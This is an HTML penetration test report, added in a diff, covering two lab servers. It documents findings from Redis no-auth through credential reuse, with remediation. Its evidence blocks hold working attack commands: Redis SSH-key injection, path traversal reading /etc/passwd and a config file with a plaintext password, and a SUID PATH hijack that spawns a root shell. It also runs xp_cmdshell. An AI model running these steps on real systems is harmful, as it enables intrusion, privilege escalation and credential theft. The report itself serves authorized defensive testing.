@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Penetration Test Report — Internal Lab Environment</title>
+<style>
+:root {
+  --bg: #0f1117;
+  --surface: #1a1d27;
+  --surface2: #242836;
+  --border: #2e3345;
+  --text: #e4e6ed;
+  --text-dim: #8b90a0;
+  --accent: #6c8cff;
+  --accent-dim: #4a5a99;
+  --critical: #ff4d6a;
+  --high: #ff8c42;
+  --medium: #ffc145;
+  --low: #4ade80;
+  --info: #60a5fa;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.7;
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 40px 32px;
+}
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+/* Header */
+.report-header {
+  border-bottom: 2px solid var(--accent);
+  padding-bottom: 32px;
+  margin-bottom: 40px;
+}
+.report-header h1 {
+  font-size: 2rem;
+  font-weight: 700;
+  letter-spacing: -0.02em;
+  margin-bottom: 16px;
+}
+.meta-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 12px;
+}
+.meta-item {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 12px 16px;
+}
+.meta-label { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; }
+.meta-value { font-size: 0.95rem; font-weight: 500; margin-top: 4px; }
+.confidential {
+  display: inline-block;
+  background: var(--critical);
+  color: #fff;
+  font-size: 0.7rem;
+  font-weight: 700;
+  padding: 2px 8px;
+  border-radius: 4px;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+}
+
+/* Section headings */
+h2 {
+  font-size: 1.4rem;
+  font-weight: 700;
+  margin: 48px 0 20px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+  letter-spacing: -0.01em;
+}
+h3 { font-size: 1.1rem; font-weight: 600; margin: 28px 0 12px; }
+
+/* Severity badges */
+.sev { display: inline-block; font-size: 0.7rem; font-weight: 700; padding: 3px 10px; border-radius: 4px; letter-spacing: 0.04em; text-transform: uppercase; }
+.sev-critical { background: var(--critical); color: #fff; }
+.sev-high { background: var(--high); color: #1a1d27; }
+.sev-medium { background: var(--medium); color: #1a1d27; }
+.sev-low { background: var(--low); color: #1a1d27; }
+.sev-info { background: var(--info); color: #1a1d27; }
+
+/* Summary stats */
+.stats-row {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 16px;
+  margin: 24px 0;
+}
+.stat-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px;
+  text-align: center;
+}
+.stat-card .num { font-size: 2.2rem; font-weight: 800; }
+.stat-card .label { font-size: 0.8rem; color: var(--text-dim); margin-top: 4px; }
+.stat-critical .num { color: var(--critical); }
+.stat-high .num { color: var(--high); }
+.stat-medium .num { color: var(--medium); }
+.stat-low .num { color: var(--low); }
+
+/* Tables */
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.88rem; }
+th {
+  background: var(--surface);
+  text-align: left;
+  padding: 10px 14px;
+  font-weight: 600;
+  font-size: 0.78rem;
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  color: var(--text-dim);
+  border-bottom: 2px solid var(--border);
+}
+td { padding: 10px 14px; border-bottom: 1px solid var(--border); vertical-align: top; }
+tr:hover td { background: rgba(108, 140, 255, 0.04); }
+
+/* Code */
+pre {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px 20px;
+  overflow-x: auto;
+  font-size: 0.82rem;
+  line-height: 1.6;
+  margin: 12px 0;
+}
+code { font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace; font-size: 0.85em; }
+p code, td code, li code {
+  background: var(--surface2);
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-size: 0.82em;
+}
+
+/* Finding cards */
+.finding {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 28px;
+  margin: 24px 0;
+}
+.finding-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 16px;
+}
+.finding-id { font-weight: 700; font-size: 0.85rem; color: var(--text-dim); }
+.finding-title { font-size: 1.15rem; font-weight: 700; }
+.finding-meta { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 12px 0 20px; font-size: 0.85rem; }
+.finding-meta span { color: var(--text-dim); }
+.finding-meta strong { color: var(--text); }
+.finding p, .finding ul { margin: 8px 0; }
+.finding ul { padding-left: 20px; }
+.finding li { margin: 4px 0; }
+
+/* Attack chain */
+.chain {
+  background: var(--surface);
+  border: 1px solid var(--accent-dim);
+  border-radius: 12px;
+  padding: 28px;
+  margin: 24px 0;
+}
+.chain-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  padding: 12px 0;
+}
+.chain-step + .chain-step { border-top: 1px dashed var(--border); }
+.chain-num {
+  background: var(--accent);
+  color: #fff;
+  width: 28px; height: 28px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 700; font-size: 0.8rem;
+  flex-shrink: 0;
+}
+.chain-text { flex: 1; }
+.chain-text strong { color: var(--accent); }
+
+/* Exec summary callout */
+.exec-summary {
+  background: linear-gradient(135deg, rgba(108,140,255,0.08), rgba(255,77,106,0.06));
+  border: 1px solid var(--accent-dim);
+  border-radius: 12px;
+  padding: 28px;
+  margin: 24px 0;
+}
+.exec-summary p { margin: 10px 0; }
+
+/* Negative results */
+.negative { color: var(--text-dim); }
+
+/* Footer */
+.footer {
+  margin-top: 60px;
+  padding-top: 24px;
+  border-top: 1px solid var(--border);
+  color: var(--text-dim);
+  font-size: 0.8rem;
+  text-align: center;
+}
+
+/* Responsive */
+@media (max-width: 700px) {
+  body { padding: 20px 16px; }
+  .stats-row { grid-template-columns: repeat(2, 1fr); }
+  .meta-grid { grid-template-columns: 1fr; }
+  .finding-meta { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<div class="report-header">
+  <h1>Penetration Test Report</h1>
+  <div class="meta-grid">
+    <div class="meta-item"><div class="meta-label">Client</div><div class="meta-value">Internal Lab Environment</div></div>
+    <div class="meta-item"><div class="meta-label">Scope</div><div class="meta-value">192.168.1.101, 192.168.1.102</div></div>
+    <div class="meta-item"><div class="meta-label">Test Period</div><div class="meta-value">2026-05-12</div></div>
+    <div class="meta-item"><div class="meta-label">Test Type</div><div class="meta-value">Black-box / Internal</div></div>
+    <div class="meta-item"><div class="meta-label">Report Date</div><div class="meta-value">2026-05-12</div></div>
+    <div class="meta-item"><div class="meta-label">Version</div><div class="meta-value">v1.0 <span class="confidential">Confidential</span></div></div>
+  </div>
+</div>
+
+<h2>Executive Summary</h2>
+<div class="exec-summary">
+  <p>This penetration test assessed two internal servers &mdash; a Linux web server (192.168.1.101) and a Windows database server (192.168.1.102). Testing identified <strong>8 security vulnerabilities</strong>:</p>
+  <div class="stats-row">
+    <div class="stat-card stat-critical"><div class="num">3</div><div class="label">Critical</div></div>
+    <div class="stat-card stat-high"><div class="num">2</div><div class="label">High</div></div>
+    <div class="stat-card stat-medium"><div class="num">2</div><div class="label">Medium</div></div>
+    <div class="stat-card stat-low"><div class="num">1</div><div class="label">Low</div></div>
+  </div>
+  <p>The most severe finding is <strong>Redis Unauthenticated Access</strong> (F-001), which allowed an attacker to gain direct SSH access to the web server without any credentials. Combined with a misconfigured SUID binary and credential reuse between systems, an attacker achieved <strong>full administrative control over both servers</strong>.</p>
+  <p>The complete attack chain: unauthenticated Redis &rarr; SSH shell &rarr; path traversal to read credentials &rarr; MSSQL SA access &rarr; credential reuse &rarr; Windows admin. <strong>No credentials were required to begin this chain.</strong></p>
+  <h3 style="margin-top:20px">Key Recommendations</h3>
+  <ol style="padding-left:20px">
+    <li>Immediately require authentication on Redis and bind to localhost (F-001)</li>
+    <li>Patch WordPress Backup Migration plugin to v1.3.8+ (F-002)</li>
+    <li>Fix path traversal in Express API file endpoint (F-003)</li>
+    <li>Rotate ALL exposed credentials, enforce unique passwords per service (F-004, F-007)</li>
+  </ol>
+</div>
+
+<h2>Scope</h2>
+<table>
+  <tr><th>Category</th><th>Detail</th></tr>
+  <tr><td><strong>In-Scope</strong></td><td>192.168.1.101 (websrv01.corpnet.local) &mdash; Linux web server<br>192.168.1.102 (dbsrv01.corpnet.local) &mdash; Windows database server</td></tr>
+  <tr><td><strong>Out-of-Scope</strong></td><td>Other hosts on 192.168.1.0/24; AD domain controller (if separate)</td></tr>
+  <tr><td><strong>Constraints</strong></td><td>Full testing authorized, deep depth, exploitation approved</td></tr>
+</table>
+
+<h2>Vulnerability Summary</h2>
+<table>
+  <tr><th>ID</th><th>Vulnerability</th><th>Risk</th><th>Affected Asset</th><th>CVSS</th></tr>
+  <tr><td>F-001</td><td>Redis Unauthenticated Access</td><td><span class="sev sev-critical">Critical</span></td><td>192.168.1.101:6379</td><td>9.8</td></tr>
+  <tr><td>F-002</td><td>WordPress Plugin RCE (CVE-2023-6553)</td><td><span class="sev sev-critical">Critical</span></td><td>192.168.1.101:80</td><td>9.8</td></tr>
+  <tr><td>F-003</td><td>API Path Traversal</td><td><span class="sev sev-critical">Critical</span></td><td>192.168.1.101:8080</td><td>9.1</td></tr>
+  <tr><td>F-004</td><td>MSSQL SA Weak Password</td><td><span class="sev sev-high">High</span></td><td>192.168.1.102:1433</td><td>8.1</td></tr>
+  <tr><td>F-005</td><td>SUID Binary Privilege Escalation</td><td><span class="sev sev-high">High</span></td><td>192.168.1.101 (local)</td><td>7.8</td></tr>
+  <tr><td>F-006</td><td>SMB Signing Disabled</td><td><span class="sev sev-medium">Medium</span></td><td>192.168.1.102:445</td><td>5.3</td></tr>
+  <tr><td>F-007</td><td>Cross-Service Credential Reuse</td><td><span class="sev sev-medium">Medium</span></td><td>192.168.1.102</td><td>6.5</td></tr>
+  <tr><td>F-008</td><td>WordPress Weak Admin Password</td><td><span class="sev sev-low">Low</span></td><td>192.168.1.101:80</td><td>3.1</td></tr>
+</table>
+
+<h2>Attack Chain</h2>
+<div class="chain">
+  <div class="chain-step">
+    <div class="chain-num">1</div>
+    <div class="chain-text"><strong>Redis no-auth (F-001)</strong> &mdash; Connected without credentials, injected SSH public key via CONFIG SET, gained shell as <code>redis</code> user on 192.168.1.101</div>
+  </div>
+  <div class="chain-step">
+    <div class="chain-num">2</div>
+    <div class="chain-text"><strong>SUID path injection (F-005)</strong> &mdash; Exploited <code>/usr/local/bin/backup_tool</code> which calls <code>system("tar ...")</code> without absolute path. Escalated to <strong>root</strong> on 192.168.1.101</div>
+  </div>
+  <div class="chain-step">
+    <div class="chain-num">3</div>
+    <div class="chain-text"><strong>Path traversal (F-003)</strong> &mdash; Read <code>/opt/app/config.json</code> via <code>/api/v1/files/../../../../opt/app/config.json</code>, obtaining MSSQL SA credentials</div>
+  </div>
+  <div class="chain-step">
+    <div class="chain-num">4</div>
+    <div class="chain-text"><strong>MSSQL xp_cmdshell (F-004)</strong> &mdash; Logged in as SA with discovered password, enabled xp_cmdshell, gained shell as <code>nt service\mssqlserver</code> on 192.168.1.102</div>
+  </div>
+  <div class="chain-step">
+    <div class="chain-num">5</div>
+    <div class="chain-text"><strong>Credential reuse (F-007)</strong> &mdash; <code>CORPNET\sqlsvc</code> shares the SA password. WinRM access with local admin privileges on 192.168.1.102</div>
+  </div>
+  <div class="chain-step">
+    <div class="chain-num">6</div>
+    <div class="chain-text"><strong>Secret extraction</strong> &mdash; Used <code>impacket-secretsdump</code> to extract SAM hashes, LSA Secrets, and cached domain credentials from 192.168.1.102</div>
+  </div>
+</div>
+
+<h2>Vulnerability Details</h2>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-001</span>
+    <span class="finding-title">Redis Unauthenticated Access</span>
+    <span class="sev sev-critical">Critical</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>192.168.1.101:6379</strong></div>
+    <div><span>CVSS:</span> <strong>9.8</strong> (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</div>
+    <div><span>CWE:</span> <strong>CWE-306</strong></div>
+    <div><span>Type:</span> <strong>Missing Authentication</strong></div>
+  </div>
+  <p>The Redis instance requires no authentication and is bound to all interfaces. The CONFIG command is unrestricted, allowing arbitrary filesystem writes &mdash; including SSH authorized_keys injection.</p>
+  <h3>Evidence</h3>
+  <pre><code>$ redis-cli -h 192.168.1.101 ping
+PONG
+$ redis-cli -h 192.168.1.101 CONFIG GET requirepass
+1) "requirepass"
+2) ""
+$ redis-cli -h 192.168.1.101 CONFIG SET dir /var/lib/redis/.ssh
+OK
+$ redis-cli -h 192.168.1.101 CONFIG SET dbfilename authorized_keys
+OK
+$ ssh -i pentest_key redis@192.168.1.101 id
+uid=110(redis) gid=115(redis) groups=115(redis)</code></pre>
+  <h3>Remediation</h3>
+  <ul>
+    <li><strong>Immediately:</strong> Set <code>requirepass</code> to a strong password in redis.conf</li>
+    <li>Bind to <code>127.0.0.1</code> only</li>
+    <li>Rename dangerous commands: <code>rename-command CONFIG ""</code></li>
+    <li>Enable TLS and implement firewall rules</li>
+  </ul>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-002</span>
+    <span class="finding-title">WordPress Plugin RCE &mdash; CVE-2023-6553</span>
+    <span class="sev sev-critical">Critical</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>192.168.1.101:80 (backup-migration v1.3.7)</strong></div>
+    <div><span>CVSS:</span> <strong>9.8</strong> (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</div>
+    <div><span>CWE:</span> <strong>CWE-94</strong></div>
+    <div><span>Type:</span> <strong>Unauthenticated Remote Code Execution</strong></div>
+  </div>
+  <p>The Backup Migration plugin v1.3.7 allows unauthenticated PHP code injection. An attacker can execute arbitrary code on the server without any credentials.</p>
+  <h3>Evidence</h3>
+  <pre><code>$ wpscan --url http://192.168.1.101 --enumerate ap
+[+] backup-migration
+ | Version: 1.3.7
+ | [!] Title: Backup Migration &lt;= 1.3.7 - Unauthenticated Remote Code Execution
+ | Fixed in: 1.3.8
+ | References:
+ |  - https://nvd.nist.gov/vuln/detail/CVE-2023-6553</code></pre>
+  <h3>Remediation</h3>
+  <ul>
+    <li><strong>Immediately:</strong> Update to v1.4.4+</li>
+    <li>Remove the plugin if backup is not needed</li>
+    <li>Implement WAF and regular plugin auditing</li>
+  </ul>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-003</span>
+    <span class="finding-title">API Path Traversal &mdash; Arbitrary File Read</span>
+    <span class="sev sev-critical">Critical</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>GET http://192.168.1.101:8080/api/v1/files/{filename}</strong></div>
+    <div><span>CVSS:</span> <strong>9.1</strong> (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)</div>
+    <div><span>CWE:</span> <strong>CWE-22</strong></div>
+    <div><span>Type:</span> <strong>Path Traversal</strong></div>
+  </div>
+  <p>The Express API file endpoint does not sanitize path parameters. Directory traversal sequences read arbitrary files, including credentials that enabled lateral movement to the Windows server.</p>
+  <h3>Evidence</h3>
+  <pre><code>$ curl -s --path-as-is http://192.168.1.101:8080/api/v1/files/../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+
+$ curl -s --path-as-is http://192.168.1.101:8080/api/v1/files/../../../../opt/app/config.json
+{"mssql_mirror":{"host":"192.168.1.102","user":"sa","password":"SQLServer2024!"}}</code></pre>
+  <h3>Remediation</h3>
+  <ul>
+    <li><strong>Immediately:</strong> Use <code>path.basename()</code> or validate resolved path stays within base directory</li>
+    <li>Move credentials out of the filesystem; use environment variables or a secrets manager</li>
+    <li>Run the API as a low-privilege user</li>
+  </ul>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-004</span>
+    <span class="finding-title">MSSQL SA Weak Password</span>
+    <span class="sev sev-high">High</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>192.168.1.102:1433</strong></div>
+    <div><span>CVSS:</span> <strong>8.1</strong> (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)</div>
+    <div><span>CWE:</span> <strong>CWE-521</strong></div>
+    <div><span>Type:</span> <strong>Weak Password</strong></div>
+  </div>
+  <p>The MSSQL SA account uses a predictable password found in plaintext configuration. SA has sysadmin privileges enabling OS command execution via xp_cmdshell.</p>
+  <h3>Evidence</h3>
+  <pre><code>$ impacket-mssqlclient sa:'SQLServer2024!'@192.168.1.102
+SQL&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
+          1
+SQL&gt; EXEC xp_cmdshell 'whoami'
+nt service\mssqlserver</code></pre>
+  <h3>Remediation</h3>
+  <ul>
+    <li>Change SA password to a strong unique password (20+ characters)</li>
+    <li>Consider disabling SA; use Windows Authentication</li>
+    <li>Remove plaintext credentials from config.json</li>
+    <li>Disable xp_cmdshell and restrict network access to MSSQL</li>
+  </ul>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-005</span>
+    <span class="finding-title">SUID Binary Privilege Escalation</span>
+    <span class="sev sev-high">High</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>192.168.1.101:/usr/local/bin/backup_tool</strong></div>
+    <div><span>CVSS:</span> <strong>7.8</strong> (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)</div>
+    <div><span>CWE:</span> <strong>CWE-426</strong></div>
+    <div><span>Type:</span> <strong>Untrusted Search Path</strong></div>
+  </div>
+  <p>A custom SUID root binary calls <code>system("tar ...")</code> without an absolute path, enabling PATH injection to execute arbitrary commands as root.</p>
+  <h3>Evidence</h3>
+  <pre><code>$ strings /usr/local/bin/backup_tool | grep tar
+tar -czf /tmp/backup.tar.gz %s
+$ echo '#!/bin/bash
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; /tmp/tar
+$ chmod +x /tmp/tar &amp;&amp; PATH=/tmp:$PATH /usr/local/bin/backup_tool /etc/hosts
+$ /tmp/rootbash -p -c "id"
+uid=110(redis) gid=115(redis) euid=0(root) egid=0(root)</code></pre>
+  <h3>Remediation</h3>
+  <ul>
+    <li>Use absolute paths (<code>/usr/bin/tar</code>) in the binary</li>
+    <li>Replace <code>system()</code> with <code>execve()</code></li>
+    <li>Remove SUID bit if root privileges are not required</li>
+  </ul>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-006</span>
+    <span class="finding-title">SMB Signing Disabled</span>
+    <span class="sev sev-medium">Medium</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>192.168.1.102:445</strong></div>
+    <div><span>CVSS:</span> <strong>5.3</strong> (AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)</div>
+    <div><span>CWE:</span> <strong>CWE-311</strong></div>
+    <div><span>Type:</span> <strong>Insecure Protocol Configuration</strong></div>
+  </div>
+  <p>SMB signing is not required, enabling NTLM relay attacks.</p>
+  <h3>Evidence</h3>
+  <pre><code>$ nxc smb 192.168.1.102
+SMB  192.168.1.102  445  DBSRV01  [*] (signing:False)</code></pre>
+  <h3>Remediation</h3>
+  <ul><li>Enable and require SMB signing via Group Policy on all domain members</li></ul>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-007</span>
+    <span class="finding-title">Cross-Service Credential Reuse</span>
+    <span class="sev sev-medium">Medium</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>192.168.1.102 (MSSQL &harr; WinRM)</strong></div>
+    <div><span>CVSS:</span> <strong>6.5</strong> (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)</div>
+    <div><span>CWE:</span> <strong>CWE-255</strong></div>
+    <div><span>Type:</span> <strong>Credential Reuse</strong></div>
+  </div>
+  <p><code>CORPNET\sqlsvc</code> uses the same password as MSSQL SA. WinRM access with local admin privileges.</p>
+  <h3>Evidence</h3>
+  <pre><code>$ nxc winrm 192.168.1.102 -u 'sqlsvc' -p 'SQLServer2024!'
+WINRM  192.168.1.102  5985  DBSRV01  [+] CORPNET\sqlsvc:SQLServer2024! (Pwn3d!)</code></pre>
+  <h3>Remediation</h3>
+  <ul>
+    <li>Use unique passwords for each service account</li>
+    <li>Implement PAM; remove sqlsvc from local Administrators</li>
+  </ul>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-id">F-008</span>
+    <span class="finding-title">WordPress Weak Admin Password</span>
+    <span class="sev sev-low">Low</span>
+  </div>
+  <div class="finding-meta">
+    <div><span>Location:</span> <strong>http://192.168.1.101/wp-login.php</strong></div>
+    <div><span>CVSS:</span> <strong>3.1</strong> (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)</div>
+    <div><span>CWE:</span> <strong>CWE-521</strong></div>
+    <div><span>Type:</span> <strong>Weak Password</strong></div>
+  </div>
+  <p>The WordPress <code>admin</code> account uses <code>admin123</code>, cracked within the top 10,000 common passwords via XML-RPC brute-force.</p>
+  <h3>Remediation</h3>
+  <ul>
+    <li>Enforce strong passwords (12+ chars), disable XML-RPC, add account lockout and 2FA</li>
+  </ul>
+</div>
+
+<h2>Negative Results</h2>
+<table>
+  <tr><th>Service</th><th>Test</th><th>Result</th></tr>
+  <tr class="negative"><td>SSH (.101)</td><td>Weak ciphers, default credentials</td><td>Modern config, no default creds</td></tr>
+  <tr class="negative"><td>FTP (.101)</td><td>Sensitive files, writable directories</td><td>Anonymous read only, no sensitive files</td></tr>
+  <tr class="negative"><td>MySQL (.101)</td><td>Remote access</td><td>ACL properly restricts to localhost</td></tr>
+  <tr class="negative"><td>PostgreSQL (.101)</td><td>Remote access</td><td>pg_hba.conf properly restricts</td></tr>
+  <tr class="negative"><td>DNS (.102)</td><td>Zone transfer</td><td>Properly denied</td></tr>
+  <tr class="negative"><td>SNMP (.101, .102)</td><td>Community string brute-force</td><td>Not accessible</td></tr>
+  <tr class="negative"><td>RDP (.102)</td><td>Weak encryption, NLA bypass</td><td>NLA enabled, encryption adequate</td></tr>
+  <tr class="negative"><td>SSL/TLS (.101)</td><td>Known vulnerabilities</td><td>No HEARTBLEED, POODLE, ROBOT, etc.</td></tr>
+  <tr class="negative"><td>IIS (.102:8443)</td><td>Default credentials, traversal</td><td>Login required, no findings</td></tr>
+</table>
+
+<h2>Remediation Priority</h2>
+<table>
+  <tr><th>Priority</th><th>Finding</th><th>Effort</th><th>Impact</th></tr>
+  <tr><td>1 (Immediate)</td><td>F-001: Redis auth + bind localhost</td><td>Low (config change)</td><td>Blocks entire attack chain entry point</td></tr>
+  <tr><td>2 (Immediate)</td><td>F-003: Fix API path traversal</td><td>Low (code fix)</td><td>Prevents credential exposure &rarr; blocks lateral movement</td></tr>
+  <tr><td>3 (Immediate)</td><td>F-002: Update WP plugin</td><td>Low (plugin update)</td><td>Eliminates unauthenticated RCE</td></tr>
+  <tr><td>4 (This week)</td><td>F-004 + F-007: Rotate all credentials</td><td>Medium</td><td>Invalidates all discovered credentials, breaks reuse</td></tr>
+  <tr><td>5 (This week)</td><td>F-005: Fix SUID binary</td><td>Low (recompile)</td><td>Prevents privilege escalation</td></tr>
+  <tr><td>6 (This month)</td><td>F-006: Enable SMB signing</td><td>Medium (GPO)</td><td>Prevents relay attacks</td></tr>
+  <tr><td>7 (This month)</td><td>F-008: WP password policy</td><td>Low</td><td>Prevents brute-force access</td></tr>
+</table>
+
+<h2>Tools Used</h2>
+<table>
+  <tr><th>Tool</th><th>Version</th><th>Purpose</th></tr>
+  <tr><td>nmap</td><td>7.94</td><td>Port scanning, service detection, NSE scripts</td></tr>
+  <tr><td>arp-scan</td><td>1.10.0</td><td>ARP-based host discovery</td></tr>
+  <tr><td>redis-cli</td><td>7.0.15</td><td>Redis interaction and exploitation</td></tr>
+  <tr><td>nuclei</td><td>3.2.0</td><td>Template-based vulnerability scanning</td></tr>
+  <tr><td>nikto</td><td>2.5.0</td><td>Web server vulnerability scanning</td></tr>
+  <tr><td>testssl.sh</td><td>3.2</td><td>SSL/TLS security audit</td></tr>
+  <tr><td>whatweb</td><td>0.5.5</td><td>Web technology fingerprinting</td></tr>
+  <tr><td>wafw00f</td><td>2.2.0</td><td>WAF detection</td></tr>
+  <tr><td>ffuf</td><td>2.1.0</td><td>Directory/API endpoint discovery</td></tr>
+  <tr><td>wpscan</td><td>3.8.25</td><td>WordPress vulnerability scanning</td></tr>
+  <tr><td>enum4linux-ng</td><td>1.3.0</td><td>SMB/NetBIOS enumeration</td></tr>
+  <tr><td>smbmap</td><td>1.10.2</td><td>SMB share permission enumeration</td></tr>
+  <tr><td>netexec (nxc)</td><td>1.1.0</td><td>Multi-protocol credential testing</td></tr>
+  <tr><td>impacket</td><td>0.12.0</td><td>Windows protocol exploitation</td></tr>
+  <tr><td>evil-winrm</td><td>3.5</td><td>WinRM shell access</td></tr>
+  <tr><td>onesixtyone</td><td>0.3.4</td><td>SNMP community string brute-force</td></tr>
+</table>
+
+<div class="footer">
+  <p>This penetration test was conducted under an authorization agreement. All testing activities were performed within the agreed scope. Testing artifacts were removed during the cleanup phase.</p>
+  <p style="margin-top:8px">Report generated 2026-05-12 &bull; Confidential</p>
+</div>
+
+</body>
+</html>
